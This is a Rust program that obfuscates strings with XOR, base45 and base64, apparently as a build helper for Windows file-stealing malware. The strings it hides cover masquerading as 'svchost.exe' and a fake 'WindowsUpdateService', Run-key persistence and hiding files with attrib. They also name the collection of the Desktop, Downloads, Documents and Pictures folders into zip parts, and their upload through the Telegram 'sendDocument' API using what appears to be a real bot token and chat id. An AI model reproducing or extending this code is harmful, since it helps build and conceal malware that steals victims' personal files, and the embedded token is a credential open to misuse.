use base64::{engine::general_purpose, Engine as _};

const XOR_KEY: u8 = 0x55;

fn xor_encrypt(data: &[u8]) -> Vec<u8> {
    data.iter().map(|&b| b ^ XOR_KEY).collect()
}

fn main() {
    let strings_to_encode = [
        "PROGRAMDATA",
        "C:\\ProgramData",
        "WindowsUpdateService",
        "svchost.exe",
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "attrib",
        "+h",
        "collected_files_part",
        "Desktop",
        "Downloads",
        "Documents",
        "Pictures",
        "7960837487:AAFKrBL143XIALZB39n9fQ9bXXT4ldrRlns",
        "7279467950",
        "sendDocument",
        "chat_id",
        "document",
        "application/zip",
    ];

    for s in strings_to_encode.iter() {
        let xor_encrypted = xor_encrypt(s.as_bytes());
        let base45_encoded = qr_base45::encode(&xor_encrypted);
        let base64_encoded = general_purpose::STANDARD.encode(&base45_encoded);
        println!("\"{}\" -> \"{}\"", s, base64_encoded);
    }
}
